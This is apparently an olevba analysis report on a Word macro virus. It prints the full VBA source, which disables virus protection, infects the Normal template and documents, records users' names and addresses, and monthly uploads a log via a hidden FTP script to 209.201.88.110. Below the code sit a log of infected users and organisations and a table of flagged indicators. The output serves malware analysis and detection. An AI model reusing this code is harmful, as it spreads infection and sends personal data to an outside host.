olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker-based-6f7ba4746680c76a7390df2a1931caa385ae855b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker-based-6f7ba4746680c76a7390df2a1931caa385ae855b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is another marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim AD, NT As Object
Dim OurCode, UserAddress, LogData, LogUploaded As String

'Initialize Variables
Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
Set NT = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = AD.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = NT.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogUploaded") = False) Then
  
    If DocumentInfected = True Then
      LogData = AD.CodeModule.Lines(1, AD.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = NT.CodeModule.Lines(1, NT.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    Randomize
    
    For i = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\hsfx" & LogFile & ".sys"
    
' 1981
'ThisDocumenta
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogUploaded") = True
  ElseIf Day(Now()) <> 1 Then
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogUploaded") = False
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = AD.CodeModule.Lines(1, AD.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    NT.CodeModule.DeleteLines 1, NT.CodeModule.CountOfLines
    NT.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = NT.CodeModule.Lines(1, NT.CodeModule.CountOfLines)

    AD.CodeModule.DeleteLines 1, AD.CodeModule.CountOfLines
    AD.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 10:19:17  - Freitag, 11 Dez 1998
' SPo0Ky
' Blue Planet
'



' 10:50:20  - Tuesday, 5 Jan 1999
' Queensland TAFE
'



' 08:12:46  - Friday, 15 Jan 1999
' cpitty
'



' 02:03:13  - Tuesday, 19 Jan 1999
' NT Standard
'



' 10:43:16  - Friday, 5 Feb 1999
' Sally
'



' 11:23:33  - Saturday, 6 Feb 1999
' EST
'



' 11:03:03  - Sunday, 7 Feb 1999
' ALLAN DOW
'



' 03:44:29 PM - Tuesday, 9 Feb 1999
' Fibrestream Ltd
'



' 08:53:59 AM - Thursday, 18 Feb 1999
' Asiah
'



' 05:11:10 PM - Wednesday, 24 Feb 1999
' Asiah
'



' 10:05:04 AM - Thursday, 25 Feb 1999
' ktkm
'



' 10:41:46 AM - Friday, 2 Apr 1999
' Twinhead
'



' 01:07:43 PM - Monday, 26 Apr 1999
' PIKOM
'



' 03:09:46 PM - Tuesday, 18 May 1999
' Unitele
'



' 10:13:27 PM - Tuesday, 1 Jun 1999
' MA'SOM
'



' 02:19:41 PM - Saturday, 5 Jun 1999
' USER
'



' 05:17:17 PM - Thursday, 10 Jun 1999
' USER
'



' 10:05:07 PM - Wednesday, 16 Jun 1999
' Management Center
'



' 05:16:39 PM - Tuesday, 29 Jun 1999
' REZAL SAMSUL KAMAR
'



' 02:18:53 AM - Tuesday, 10 Aug 1999
' REZAL SAMSUL KAMAR
'



Private Sub OptionButton1_Click()

End Sub
' 05:13:59 PM - Friday, 13 Aug 1999
' Management Center
'



' 10:54:47 PM - Wednesday, 20 Oct 1999
' mariam moidu
'



' 11:35:41 AM - Monday, 1 Nov 1999
' Computer 4
'



' 03:53:59 AM - Friday, 26 Nov 1999
' Suria Hj.Mulia
'



' 01:54:29 PM - Wednesday, 8 Dec 1999
' Management Center
'



' 12:24:44 PM - Monday, 13 Dec 1999
' KENMS
'



' 06:02:00 PM - Tuesday, 11 Jan 2000
' Petronas Dagangan Berhad
'



' 07:15:50  - Tuesday, 8 Feb 2000
' Noor Al Ahya Hasnor
'



' 03:26:55 PM - Saturday, 25 Mar 2000
' Petronas Dagangan Berhad
'



' 02:43:11 PM - Thursday, 1 Jun 2000
' PETRONAS
'



' 02:48:29 PM - Tuesday, 22 Aug 2000
' MIT
'



' 08:47:28 AM - Monday, 11 Sep 2000
' MISC
'



' 07:27:11 AM - Tuesday, 5 Dec 2000
' user
'



' 11:39:08 AM - Thursday, 7 Dec 2000
' MISA
'



' 10:42:16 AM - Thursday, 15 Feb 2001
' MIT
'



' 02:26:17 PM - Thursday, 1 Mar 2001
' MIT
'



' 08:02:57 PM - Wednesday, 4 Jul 2001
' mit
'



' 01:18:34 PM - Thursday, 19 Jul 2001
' Righard J. Zwienenberg
'


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |OptionButton1_Click |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

